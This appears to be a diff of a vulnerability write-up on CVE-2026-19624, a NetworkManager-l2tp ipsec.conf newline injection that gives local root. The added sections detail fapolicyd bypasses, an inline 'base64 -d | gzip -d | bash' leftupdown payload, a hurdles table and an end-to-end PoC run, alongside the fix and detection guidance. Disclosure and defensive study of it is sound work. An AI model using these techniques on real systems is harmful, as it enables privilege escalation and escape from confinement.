@@ -1,21 +1,28 @@
 ---
 title: "A Newline to Root: CVE-2026-19624"
 summary: "An unprivileged D-Bus call writes a root-parsed VPN config value. One newline, root code execution, confinement escape."
-date: '2026-08-31T00:00:00Z'
+date: '2026-09-02T00:00:00Z'
 subtitle: "Unconfined root from NetworkManager-l2tp via ipsec.conf injection"
 tags: ["security", "offensive-security", "CVE-2026-19624", "selinux", "apparmor", "networkmanager", "nm-l2tp", "ipsec", "dbus", "polkit", "privilege-escalation", "linux", "exploit", "libreswan", "strongswan"]
 channels: ["vuln-research"]
 ---
 
-A single newline in a VPN field, submitted over D-Bus by any logged-in desktop user, becomes root code execution. The bug (CVE-2026-19624) is one missing check.
+A single newline in a VPN field, submitted over D-Bus by any logged-in local user, becomes root code execution. The bug (CVE-2026-19624) is one missing check.
 
 The interesting part is firing the exploit and escaping the MAC confinement you land in, which plays out differently across libreswan/strongSwan and SELinux/AppArmor. This turned into a comparison: same injection vulnerability, three completely different post-exploitation stories depending on your distro's IPsec daemon and MAC system.
 
 | Distro | IPSec daemon | MAC | Landing |
 | --- | --- | --- | --- |
-| Fedora / RHEL      | libreswan  | `SELinux`  | ipsec_mgmt_t -> escape -> unconfined root with full caps |
-| Ubuntu / Debian    | strongSwan | `AppArmor` | unconfined root -> escalate -> unconfined root with full caps |
-| SUSE Leap / SLES   | strongSwan | `SELinux`  | ipsec_mgmt_t -> escape -> unconfined root with full caps |
+| Fedora 44               | libreswan  | `SELinux`  | ipsec_mgmt_t -> escape -> unconfined root with full caps |
+| RHEL 9, 10              | libreswan  | `SELinux`  | ipsec_mgmt_t -> escape -> unconfined root with full caps |
+| RHEL 9 STIG + targeted  | libreswan  | `SELinux`  | ipsec_mgmt_t -> escape -> unconfined root with full caps |
+| RHEL 9 STIG + MLS**     | libreswan  | `SELinux`  | post-exploitation adapted to initrc_t, stock enforcing MLS adds earlier blockers |
+| Ubuntu 26               | strongSwan | `AppArmor` | unconfined root -> escalate -> unconfined root with full caps |
+| Debian 13               | strongSwan | `AppArmor` | unconfined root -> escalate -> unconfined root with full caps |
+| openSUSE Leap 16        | strongSwan | `SELinux`  | ipsec_mgmt_t -> escape -> unconfined root with full caps |
+| SUSE SLES 16            | strongSwan | `SELinux`  | ipsec_mgmt_t -> escape -> unconfined root with full caps |
+
+** The RHEL 9 STIG MLS system tested on permissive, read section for the full details.
 
 ## How I Got Here
 
@@ -49,15 +56,17 @@ This is a writeup of the bug and the root execution the exploit produces, and es
 | **Component** | `nm-l2tp-service`, the root D-Bus L2TP VPN service |
 | **Affected** | every release before the fixed set below, on every stable branch: 1.0.x, 1.2.x, 1.8.x, 1.20.x, 1.52.x |
 | **Required access** | unprivileged local user with a login session. no admin, no `wheel`, no password |
-| **Result** | code execution as root, SELinux escape to unconfined |
+| **Result** | code execution as root, tested post-exploitation paths described below |
 | **Last Vulnerable** | 1.52.2, 1.20.22, 1.8.8, 1.2.20, 1.0.14 |
 | **Fixed in** | 1.52.4, 1.20.24, 1.8.10, 1.2.22, 1.0.16, commit [95b6b46f](https://github.com/nm-l2tp/NetworkManager-l2tp/commit/95b6b46f48a0c9eabc79272cd313f219110ef91c) |
 
-Audited on Fedora 44 with NetworkManager 1.56.1 and NetworkManager-l2tp 1.52.2 + libreswan, and confirmed against upstream HEAD at the time of reporting. Also tested the injection and SELinux work extensively against RHEL 10.
+Audited on Fedora 44 with NetworkManager 1.56.1 and NetworkManager-l2tp 1.52.2 + libreswan, and confirmed against upstream HEAD at the time of reporting.
 
-Tested against Ubuntu 26.04 LTS with strongSwan. AppArmor confinement escape and documentation of that in it's own section.
+Tested against Ubuntu 26.04 LTS and Debian 13 with strongSwan. AppArmor confinement escape and documentation of that in its own section.
 
-Also tested against openSUSE Leap 16 with strongSwan and SELinux, covered in its own section.
+Also tested against openSUSE Leap 16 and SUSE SLES 16 with strongSwan and SELinux, covered in its own section.
+
+I tested on a RHEL 9.8 server with the DISA STIG profile applied, and running the `mls` SELinux policy.
 
 ## The bug: two functions
 
@@ -115,7 +124,7 @@ Nothing between the D-Bus dictionary and the root-parsed config file rejects a n
 
 The attack is all over unprivileged system D-Bus. Add a VPN connection you own with the injection, activate it.
 
-The path from D-Bus call to ipsec.conf varies between Fedora/RHEL/SUSE and Debian/Ubuntu depending if `netplan` is involved and whether a persistent connection is added or not. Details are covered in their respective sections.
+The path from D-Bus call to ipsec.conf varies between Fedora/RHEL/SUSE and Ubuntu depending if `netplan` is involved and whether a persistent connection is added or not. Details are covered in their respective sections.
 
 At a really high level:
 
@@ -173,9 +182,9 @@ conn 232236cc-a1e0-4fe5-87ab-e2e1df80e121
 
 Fedora/RHEL run Libreswan under SELinux for the ipsec daemon.
 
-Ubuntu/Debian run strongSwan under AppArmor for the ipsec daemon.
+Ubuntu runs strongSwan under AppArmor for the ipsec daemon.
 
-SUSE runs strongSwan like Ubuntu/Debian, but it runs SELinux for MAC like Fedora/RHEL. A mix of the other distros.
+SUSE runs strongSwan like Ubuntu, but it runs SELinux for MAC like Fedora/RHEL. A mix of the other distros.
 
 `leftupdown` is a command the ipsec daemon runs when a connection changes state. It runs as root. There are 5 events that can fire that command: (`prepare-host`, `route-host`, `up-host`, `down-host`, `unroute-host`). `Libreswan` fires even against a dead/non-existent peer but `strongSwan` only fires on a live CHILD_SA.
 
@@ -464,7 +473,9 @@ Now that it can talk to the socket, it can drive pluto to load the injected conf
 
 ## Ubuntu/Debian + AppArmor
 
-Everything above was Fedora/RHEL, libreswan, SELinux. Ubuntu and Debian run `strongSwan` under `AppArmor` and the differences went a lot deeper than I expected.
+Everything above was Fedora/RHEL, libreswan, SELinux. Ubuntu/Debian run `strongSwan` under `AppArmor` and the differences went a lot deeper than I expected.
+
+My test Debian 13 server installation did not use network-manager. A workstation installation did. Given that the vulnerability is a NetworkManager plugin, this is a big difference. So I tested this against a workstation for Debian.
 
 ### netplan Interruption
 
@@ -494,7 +505,7 @@ conn 548dbce3-945c-410a-a562-6e4229b8dae7
 
 ```
 
-Our injection got printed into the ipsec config with \n instead of being parsed into newlines. On Fedora/RHEL/SUSE, NetworkManager writes the connection directly to a configuration file and reads it back. On Ubuntu, NetworkManager integrates `netplan` so `AddConnection` writes a netplan YAML configuration file, then `netplan generate` produces the nmconnection file that NetworkManager loads.
+Our injection got printed into the ipsec config with \n instead of being parsed into newlines. On Fedora/RHEL/SUSE/Debian, NetworkManager writes the connection directly to a configuration file and reads it back. On Ubuntu, NetworkManager integrates `netplan` so `AddConnection` writes a netplan YAML configuration file, then `netplan generate` produces the nmconnection file that NetworkManager loads.
 
 The netplan YAML looks like this:
 
@@ -763,13 +774,24 @@ $ ps auxw | wc -l
 254
 ```
 
+On my Debian 13 system 2 processes out of ~329:
+
+```bash
+$ sudo aa-status | grep process
+2 processes have profiles defined.
+2 processes are in enforce mode.
+
+$ ps auxw | wc -l
+329
+```
+
 The rest are running unconfined, on an AppArmor "enforcing" system.
 
 ## SUSE + SELinux
 
 SUSE SLES 16 and openSUSE Leap 16 are an interesting combination of the previous - pulls strongswan by default for the ipsec daemon and it runs SELinux. nm-l2tp will talk to whatever ipsec daemon you have installed.
 
-So on a SUSE system you have the added difficulty of needing a responder to satisfy strongswan, and the added challenge of SELinux. Not a problem.
+So on a SUSE system you have the added difficulty of needing a responder to satisfy strongswan, and the added challenge of SELinux. Not a problem. Tested on Leap 16, confirmed SLES 16 has the same configuration.
 
 Starting as a user_u confined user without any group membership:
 
@@ -780,7 +802,7 @@ uid=1001(k) gid=1001(k) groups=1001(k) context=user_u:user_r:user_t:s0
 
 Stage the payload at /tmp/x.sh, apply the label with `chcon -t container_file_t /tmp/x.sh` covered in the Fedora/RHEL section.
 
-Run the [Go responder](#poc) laid out in the Ubuntu/Debian section where I cover strongswan.
+Run the [Go responder](#poc) laid out in the Ubuntu section where I cover strongswan.
 
 Fire the [injection PoC](#poc), you land in the same `ipsec_mgmt_t` domain covered under Fedora/RHEL.
 
@@ -827,7 +849,213 @@ CapAmb: 0000000000000000
 
 Unconfined root with full caps.
 
-## The fix
+## RHEL 9 + DISA STIG
+
+I wanted to test this in a highly constrained and hardened environment and see what the differences are and if it introduces any walls or just new challenges. I installed a RHEL 9.8 server with the "DISA STIG for Red Hat Enterprise Linux 9" profile applied during install. A fresh install scores ~95 according to an `oscap eval`.
+
+This is not a deep analysis of STIG. I am mostly covering the difference between this system and the other RHEL boxes in terms of this specific exploit. The main difference that impacts us is the addition of `fapolicyd`.
+
+### fapolicyd
+
+STIG requires `fapolicyd` which whitelists what is allowed to execute. Looking at the fapolicyd configuration on my RHEL 9 test system:
+
+```bash
+$ sudo fapolicyd-cli --list
+-> %languages=application/x-bytecode.ocaml,application/x-bytecode.python,application/java-archive,text/x-java,application/x-java-applet,application/javascript,text/javascript,text/x-awk,text/x-gawk,text/x-lisp,application/x-elc,text/x-lua,text/x-m4,text/x-nftables,text/x-perl,text/x-php,text/x-script.python,text/x-python,text/x-R,text/x-ruby,text/x-script.guile,text/x-tcl,text/x-luatex,text/x-systemtap
+1. allow perm=any uid=0 : dir=/var/tmp/
+2. allow perm=any uid=0 trust=1 : all
+3. allow perm=open exe=/usr/bin/rpm : all
+4. allow perm=open exe=/usr/bin/python3.9 comm=dnf : all
+5. deny_audit perm=any pattern=ld_so : all
+6. deny_audit perm=any all : ftype=application/x-bad-elf
+7. allow perm=open all : ftype=application/x-sharedlib trust=1
+8. deny_audit perm=open all : ftype=application/x-sharedlib
+9. allow perm=execute all : trust=1
+10. allow perm=open all : ftype=%languages trust=1
+11. deny_audit perm=any all : ftype=%languages
+12. allow perm=any all : ftype=text/x-shellscript
+13. deny_audit perm=execute all : all
+14. allow perm=open all : all
+15. deny perm=any all : all
+```
+
+We can no longer execute our own Go binary to host the local responder.
+
+```bash
+$ id
+uid=1002(kk) gid=1002(kk) groups=1002(kk) context=user_u:user_r:user_t:s0
+
+$ ./nm-l2tp-responder 
+-bash: ./nm-l2tp-responder: Operation not permitted
+
+$ go run nm-l2tp-responder.go 
+fork/exec /home/kk/.cache/go-build/4a/4a07f64d799e2e359fbcc4213077924dd2202d6aa1298bad38e28d3ad5b90bb4-d/nm-l2tp-responder: operation not permitted
+```
+
+But we are allowed to execute trusted binaries and any shell-scripts:
+
+```
+9. allow perm=execute all : trust=1
+12. allow perm=any all : ftype=text/x-shellscript
+```
+
+`python` is a binary installed from an rpm and trusted because of `trust = rpmdb`:
+
+
+```bash
+$ sudo grep ^trust /etc/fapolicyd/fapolicyd.conf 
+trust = rpmdb,file
+
+$ rpm -qf $( which python3 )
+python3-3.9.25-7.el9_8.2.x86_64
+```
+
+So I wrote a python version, but if you try to run it directly:
+
+```bash
+$ id
+uid=1002(kk) gid=1002(kk) groups=1002(kk) context=user_u:user_r:user_t:s0
+
+$ python3 nm-l2tp-responder.py 
+python3: can't open file '/home/kk/poc/nm-l2tp-responder.py': [Errno 1] Operation not permitted
+```
+
+The fapolicyd rules that match on `%languages` match our python script, and we are only allowed to execute `trusted=` scripts. We can't even open or read our own script we just wrote:
+
+```bash
+$ cat nm-l2tp-responder.py 
+cat: nm-l2tp-responder.py: Operation not permitted
+```
+
+We can work around this by passing our script as stdin to python. Except we can't directly open/read it to do that. You could curl it, echo it, base64 decode it, anything. I put the base64 encoded version into a file: 
+
+```bash
+$ base64 -d nm-l2tp-responder-base64.py | python3
+nm-l2tp-responder on 127.0.0.2:5500  psk='linnemanlabs-poc' id=127.0.0.2
+```
+
+I looked to see exactly how it matches `%languages`. It uses `libmagic` to guess at content types. The first thing I tried was removing the shebang from the top of the file that obviously gives it away. But it still matched as python:
+
+```bash
+$ fapolicyd-cli --ftype nm-l2tp-inject.py
+Cannot open nm-l2tp-inject.py - Operation not permitted
+```
+
+With no shebang, it scans the first 8192 bytes of the file's content looking for fingerprintable strings. Depending on what version of `file`/`file-libs` is installed the keywords it matches are different. If I just pad the top of the file with 8192 bytes of comments, it will always return `text/plain` for the file:
+
+
+```bash
+$ fapolicyd-cli --ftype nm-l2tp-inject.py
+text/plain
+
+$ head -1 nm-l2tp-inject.py 
+# no shebang to avoid mime-type fingerprint, run with "python3 nm-l2tp-inject.py"
+```
+
+Now that it's mime-type/magic type is `text/plain` we can `python3 x.py` directly. Lot of solutions, but I settled on this one so I don't have to share base64 blobs in my exploits, the trade-off is the python scripts have long comments at the top now.
+
+### MLS Policy
+
+STIG uses the same targeted SELinux policy as the other RHEL systems. I have been researching the MLS policy a little lately and I wanted to see how the exploit holds up there also.
+
+MLS vs targeted goes deep and is largely outside the scope of this article. MLS introduces significantly more constraints over targeted. It unloads the unconfined module, it enforces users/roles/levels/categories not just types. MLS also comes with significantly less grants than targeted does.
+
+I tested from a local login in as `user_u`/`user_r`/`user_t`.
+
+```bash
+$ id
+uid=1001(kk) gid=1001(kk) groups=1001(kk) context=user_u:user_r:user_t:s0
+```
+
+We land in the same `ipsec_mgmt_t` domain with levels and categories/classifications now under MLS:
+
+```bash
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:ipsec_mgmt_t:s0-s15:c0.c1023
+```
+
+The post-exploitation story is a different story. MLS shuts down a lot of the escape routes from my [confined root is still root](https://linnemanlabs.com/posts/confined-root-is-still-root/) research that work on targeted policy. `UDisks2` and `PackageKit` techniques are both out because neither one has the `dbusd_unconfined` attribute we use on targeted, and `ipsec_mgmt_t` does not have a specific grant to reach either of them.
+
+The [activation-pull](https://linnemanlabs.com/posts/confined-root-is-still-root/#want-link-enable) technique was one of only two that looked viable. It involves making another systemd service depend on our service, and then a D-Bus call to that service to activate it.
+
+`ipsec_mgmt_t` meets all the requirements at a glance. Checking with my [cold-activatable-services.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/selinux/confined-root-is-still-root/cold-activatable-services.sh) script, it initially reported 0 cold services, since I had originally written it for `targeted` which defaults to unconfined_service_t. In the end I corrected this issue, and there are several cold services we can ping (mls's smaller policy leaves them running as init_t, which nsswitch_domain can reach). I also found a simpler way.
+
+So I needed to find another solution to activate our service under MLS. I had a lot of ideas to explore here, but I didn't have to go too far. Look at the `ipsec_mgmt_t` service and system grants:
+
+```bash
+$ sesearch -A -s ipsec_mgmt_t -c service
+allow ipsec_mgmt_t ipsec_mgmt_unit_file_t:service { disable enable reload start status stop };
+
+$ sesearch -A -s ipsec_mgmt_t -t init_t -c system
+allow ipsec_mgmt_t init_t:system reload;
+```
+
+It can do a system-wide daemon-reload and restart the ipsec service, which bypasses our need to use a cold service. Make our service `WantedBy=ipsec.service`, and then `ipsec_mgmt_t` does a `daemon-reload` then `restart ipsec`. The `daemon-reload` picks up the `WantedBy=`, then `restart` causes systemd to start our service as a dependency. Many more ways to use that grant but this is simple and direct.
+
+systemd starts the service and runs our `Exec=` from `system_u:system_r:init_t`. If we execute a shell we transition to `initrc_t`:
+
+```bash
+$ sudo sesearch -T -s init_t -t shell_exec_t
+type_transition init_t shell_exec_t:process initrc_t;
+```
+
+I modified the activation-pull.sh to do this instead of the cold service ping.
+
+One last hurdle on mls, there are no overlapping types our confined user can write that ipsec_mgmt_t can open+read. We need to in-line our script in `LEFTUPDOWN` instead of the convenient `/bin/sh /tmp/x.sh`. I modified the PoC to base64 encode our modified activation-pull script and pass the base64 blob in like `leftupdown="echo <blob> | base64 -d | bash"`. But this hit another hurdle:
+
+```
+NetworkManager[16582]: send_wack_msg(): can't pack strings: too many bytes of strings or key to fit in message to pluto
+```
+
+The whack message has a string buffer that holds max 4096 bytes, shared across every connection field (left/right, IDs, ike=, esp=, protoports, the UUID name, and leftupdown). After nm-l2tp's other fields eat their ~150–250 B, leftupdown gets ~3.8 KB.
+
+So I piped the script to gzip before base64, and modified the payload to `leftupdown="echo <blob> | base64 -d | gzip -d | bash"`
+
+Putting it all together with the comment-stuffed python responder and gzip'd base64 encoded in-line script, fire the exploit and check our output log:
+
+```bash
+$ id
+uid=1002(kk) gid=1002(kk) groups=1002(kk) context=user_u:user_r:user_t:s0
+
+$ bash nm-l2tp-poc.sh 
+...
+[+] log created:
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0-s15:c0.c1023
+CapInh: 0000000000000000
+CapPrm: 000001ffffffffff
+CapEff: 000001ffffffffff
+CapBnd: 000001ffffffffff
+CapAmb: 0000000000000000
+```
+
+Root, full caps, `initrc_t` domain, all levels and categories - about as privileged as it gets. It gets pretty bespoke as to whether anyone needs to go further or reach a different desired context for a specific purpose. `init_t` and `initrc_t` can transition to just about anything. If not, change payloads or target labels or `setenforce 0` or a dozen other techniques if you need something specific you can't do from here depending on how the box is configured.
+
+This is the only box I ran `SELINUX=permissive` instead of enforcing. MLS is not a policy you just enable and move on and everything works. I would have had to spend a week adding grants just to let my base system operate properly.
+
+The strict policy that MLS ships with will block the self-contained exploit since it cannot host the local responder needed for strongSwan and older libreswan version. At the same time, a system with nm-l2tp installed presumably has the ability to connect to a legitimate l2tp peer, which you could connect to and activate our leftupdown. Anyone running mls in the real-world is unlikely to be running anything resembling the stock shipped policy. On a default MLS policy, nm-l2tp itself doesn't even have grants to work. So this is not meant to be an analysis of mls policy or the systems running it beyond a quick glance at the stock policy.
+
+I mostly looked at this out of curiosity to see what STIG changes would impact exploitation/post-exploitation. It required some adaptations but did not ultimately block us.
+
+The "Confined root is still root" idea is viable under the MLS policy once we reach execution in ipsec_mgmt_t, the escape just lands in `initrc_t` instead of `unconfined_service_t`, and stock enforcing MLs introduces some walls earlier in this chain.
+
+### Hurdles
+
+STIG+MLS is a relatively specific hardened environment and in the real-world would be running heavy network monitoring and strict firewall rules and content inspection (and probably not nm-l2tp to begin with). It would not make sense to provide a single PoC that is expected to work on many of those systems. I think for these types of environments I will start listing hurdles you may hit and ways around them. You will need to research and test your own environment and put the pieces together.
+
+If you are running an older libreswan that requires a full connection be established, which is the case on RHEL 9, then reaching an external responder is the most difficult part. You would need to find a host+port you can reach and also run the responder on. I would not expect that any real boxes running mls are connected to a network that is going to allow you to send ipsec traffic to a remote host on port 53 like SELinux will allow. Beyond that it is environment-specific.
+
+| Hurdle | Enforcer | Solution |
+| --- | --- | --- |
+| Sharing files from user_u to ipsec_mgmt_t | SELinux | container_file_t label (where container-selinux installed), avoid the need for it by in-lining payload in `leftupdown` |
+| Need a real vpn peer connection to fire script | strongSwan, older libreswan | Run the python responder PoC |
+| Executing our bash script | SELinux mls | run as `bash x.sh` instead of `./x.sh` |
+| Executing python responder | `fapolicyd` | remove shebang and pad with ~8kb of content, or curl and pipe to stdin, or base64 encode |
+| Exploit lands in ipsec_mgmt_t | SELinux targeted | use activation-pull.sh PoC to escape to unconfined |
+| Exploit lands in ipsec_mgmt_t | SELinux mls | modify activation-pull.sh to use ipsec daemon-reload and restart grants and use WantedBy=ipsec |
+| Unable to listen on local port for responder | SELinux mls | run responder on a different system |
+| Unable to connect to external responder | SELinux mls | run responder on port 53, set rightikeport=53 |
+| Unable to connect to external responder | Network/firewall | run responder locally if not an mls system, most likely wall otherwise, bespoke - research your environment |
+
+## The Fix
 
 I reported it to the maintainer on 15 June 2026, cc'ing Red Hat Product Security. He replied within the hour to discuss further. The fix commit landed six days later, on 21 June:
 
@@ -852,7 +1080,7 @@ called from the `G_TYPE_STRING` case of `validate_one_property` - the same place
 Running the exploit now results in a syslog entry:
 
 ```
-Aug 27 05:49:58 rhel10-server NetworkManager[1254]: <warn>  [1787824198.6969] vpn[0x55b434a70540,ce2e244a-99bc-417f-beb6-f7f1f9e6ae22,"linnemanlabs-poc"]: failed to connect: 'property 'ipsec-ike' contains a control character'
+NetworkManager[1254]: <warn>  [1787824198.6969] vpn[0x55b434a70540,ce2e244a-99bc-417f-beb6-f7f1f9e6ae22,"linnemanlabs-poc"]: failed to connect: 'property 'ipsec-ike' contains a control character'
 ```
 
 NetworkManager still stores and shares it raw, it is up to the consumer to check at entry points.
@@ -866,10 +1094,14 @@ Checked on 8-31-2026 reading the packaged source to not miss a distro backportin
 | Distribution | Version | Control-character guard |
 | - | - | - |
 | Fedora 43 / 44 | 1.52.4 | present |
+| RHEL 9 | 1.52.4-1.el9 | present |
+| RHEL 10 | 1.52.4-1.el10_2 | present |
 | Debian sid / forky | 1.52.4-1 | present |
 | Ubuntu 26.04 LTS | 1.52.0-2 (universe) | absent |
 | Debian trixie (stable) | 1.20.20-2 | absent |
 | Debian bookworm | 1.20.8-1 | absent |
+| SUSE SLES 16 | 1.20.10-bp160 | absent  |
+| openSUSE Leap 16 | 1.20.10-bp160 | absent  |
 
 The fixed 1.20.24 exists so the 1.20.x-era distributions can take it. Debian testing and unstable did pick up 1.52.4 in July. The stable branch, and Ubuntu 26.04, did not.
 
@@ -897,7 +1129,7 @@ There are also writes to `/run/nm-l2tp-<uuid>/ipsec.conf` for each activation th
 
 File integrity monitoring on `/run/nm-l2tp-*/` with the string `leftupdown=` in it is a pretty simple and effective detection for this PoC.
 
-There is a cleanup function `real_disconnect()` that unlinks the tmp files and rmdirs `/run/nm-l2tp-<uuid>/` - but only on a clean disconnect of an established connection. The libreswan PoC doesn't fully establish and the strongSwan ones tear down before a clean disconnect fires `real_disconnect()`. So the `/run/nm-l2tp-<uuid>/` directories stay until reboot or manual deletion.
+There is a cleanup function `real_disconnect()` that unlinks the tmp files and rmdirs `/run/nm-l2tp-<uuid>/` - but only on a clean disconnect of an established connection. The libreswan PoC doesn't fully establish and the strongSwan ones tear down before a clean disconnect fires `real_disconnect()`. So the `/run/nm-l2tp-<uuid>/` directories may stay until reboot or manual deletion.
 
 For the `AddAndActivateConnection2()` method, any value of `persist=` other than `volatile` creates a NetworkManager `.nmconnection` keyfile under `/run/NetworkManager/system-connections/`, which can be detected and checked for the suspicious patterns.
 
@@ -930,8 +1162,50 @@ PoCs are up on the [LinnemanLabs Advisories GitHub](https://github.com/linnemanl
 
 | PoC | Purpose |
 |-|-|
+| [nm-l2tp-poc.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/nm-l2tp/nm-l2tp-poc.sh) | self-contained, portable exploit |
 | [nm-l2tp-inject.py](https://github.com/linnemanlabs/advisories/blob/main/poc/nm-l2tp/nm-l2tp-inject.py) | add profile, connect, exploit |
 | [nm-l2tp-responder.go](https://github.com/linnemanlabs/advisories/blob/main/poc/nm-l2tp/nm-l2tp-responder.go) | Go IKE responder (needed for strongswan) |
+
+### End-to-End
+
+The earlier sections walk through the individual components manually. To fire the entire thing end-to-end from one script use [nm-l2tp-poc.sh](https://github.com/linnemanlabs/advisories/blob/main/poc/nm-l2tp/nm-l2tp-poc.sh).
+
+I made this as portable as possible and tested on Fedora 44, RHEL 9, RHEL 10, Ubuntu 26, openSUSE Leap 16, SUSE SLES 16, and RHEL 9 STIG + targeted and mls.
+
+This is one run from SUSE SLES 16:
+
+```bash
+$ id
+uid=1000(kk) gid=1000(kk) groups=1000(kk) context=user_u:user_r:user_t:s0
+
+$ ./nm-l2tp-poc.sh 
+[*] selinux detected
+[*] selinux enforcing, will stage properly and escape
+[*] SELinux policy: targeted
+[*] in-lining payload
+[*] starting responder in background
+[*] nm-l2tp-responder on 127.0.0.2:5500 psk='linnemanlabs-poc' id=127.0.0.2
+[*] running injection
+[+] connection added:     /org/freedesktop/NetworkManager/Settings/12
+[+] connection activated: /org/freedesktop/NetworkManager/ActiveConnection/12
+[*] uuid: 71dcb138-e24b-463a-be4b-d0f6d940a8be
+[*] finished injection, waiting for output logs /tmp/ipsec.out-1788739076
+[*] Waiting for log file..
+[*] INIT: from ('127.0.0.1', 4500) SPIi=9cc0753c9d593bec
+[*] AUTH: initiator PSK verified OK
+[*] AUTH: child SA - selecting initiator proposal #1 (proto=3) our SPI=8a64382d
+[*] AUTH: responded - initiator should install CHILD_SA and fire leftupdown (verb=up-host)
+[+] log created:
+uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
+CapInh: 0000000000000000
+CapPrm: 000001ffffffffff
+CapEff: 000001ffffffffff
+CapBnd: 000001ffffffffff
+CapAmb: 0000000000000000
+[*] done
+[*] cleaning up NM connections
+Connection 'linnemanlabs-poc' (71dcb138-e24b-463a-be4b-d0f6d940a8be) successfully deleted.
+```
 
 I am using 127.0.0.2 in the PoC because 127.0.0.0/8 is entirely loopback - the kernel routes any 127.x to lo. The vpn conn is `left=127.0.0.1 right=127.0.0.2` and since `right=` is not a locally bound address it gets treated as a remote peer. Another benefit is there is no external traffic to be detected by upstream network monitoring.
 
@@ -956,19 +1230,37 @@ Run nmcli from the same local login session.
 - NetworkManager-l2tp wrote `ipsec-ike` values into a root-parsed `ipsec.conf` with no escaping
 - A newline in that value injects an arbitrary directive. `leftupdown=<cmd>` is a command the ipsec daemon runs as root
 - The whole attack is one D-Bus call, operates on your own profile, works from an unprivileged local user
-- SELinux enforcing doesn't prevent it, it forces execution through a shell plus a readable script label (container_file_t)
+- SELinux targeted/enforcing on the tested Fedora/RHEL/SUSE systems doesn't prevent it, it forces execution through a shell plus a readable script label (container_file_t)
 - SELinux post-exploitation lands in `ipsec_mgmt_t` which we have several routes to escape to unconfined root with full caps
-- AppArmor enforcing does not prevent the exploit or any post-exploitation work, trivial escape to unconfined root with full caps
+- AppArmor enforcing on my tested Debian/Ubuntu systems does not prevent the exploit or any post-exploitation work, trivial escape to unconfined root with full caps
 - [confined root is still root](/posts/confined-root-is-still-root/)
 - CVE-2026-19624, fixed in 1.52.4 / 1.20.24 / 1.8.10 / 1.2.22 / 1.0.16
 
 ## Closing Thoughts
 
-Another example of the "confined root is still root" theme when it comes to SELinux targeted policy.
+During my original vulnerability research I ran a real ipsec daemon in a namespace to fire it, but I wanted something simple and shareable and that snowballed. I originally considered this a trivial exploit, and figured it would take an hour or two to write and document and move on. If you are wondering what goes into this research, this is how it went for me:
 
-SELinux continues to be one of the most under-discussed and under-rated but widely distributed tools in my opinion. SUSE migrated from AppArmor. Will Debian/Ubuntu?
+- vulnerability research into NetworkManager and plugins, find bug
+- then write original exploit using namespaces (required privileged veth binding)
+- then test AppArmor and add escalation
+- then test exploit against SELinux system, analyze domain, add escapes
+- then start work on shareable PoCs
+- then a minimal Go IKE responder to satisfy strongSwan
+- then a Python port for boxes that run fapolicyd or don't have Go
+- then completing the full CHILD_SA to get past old libreswan versions stricter pluto
+- then using 127.0.0.2 for right= so we will be treated as a remote peer but receive the connection
+- then setting leftikeport=4500 to prevent the nat-t port re-write under strongswan
+- then moving from AddConnection to AddAndActivateConnection2 with persist=volatile to bypass netplan on Ubuntu
+- then checking ipsec daemon+version at config generation time to avoid keyingtries duplicate error
+- then a shebangless and comment-padded script to get past fapolicyd's libmagic fingerprinting
+- then in-lining the payload for mls or systems without container-selinux package
+- then gzipping the payload to fit libreswan's ~4 KB whack buffer
+- then reworking the SELinux escape to work on both targeted and mls
+- all tested across Fedora 44, RHEL 9 and 10, Ubuntu 26, openSUSE Leap 16, SLES 16, and a RHEL 9 STIG+MLS system
 
-I have not done deep enough research into AppArmor to have a strong opinion on it, but it has never provided more than a small inconvenience in any exploits I have written.
+Working all of that into one portable exploit was the most challenging and rewarding part. Vulnerability research and finding the bug is only the first step. "Exploitation left as an exercise to the reader" is not something you will see in my write-ups.
+
+Another example of the "confined root is still root" theme under SELinux targeted policy, and now also mls. SELinux is one of the more powerful security systems available, worth putting the time in to really analyze and optimize your policies.
 
 The most interesting part is that the fix existed, in the same source tree, in two neighbouring plugins, one of them for eight years. No one told the nm-l2tp maintainer when they fixed the 2 adjacent CVEs 6 years apart.
 
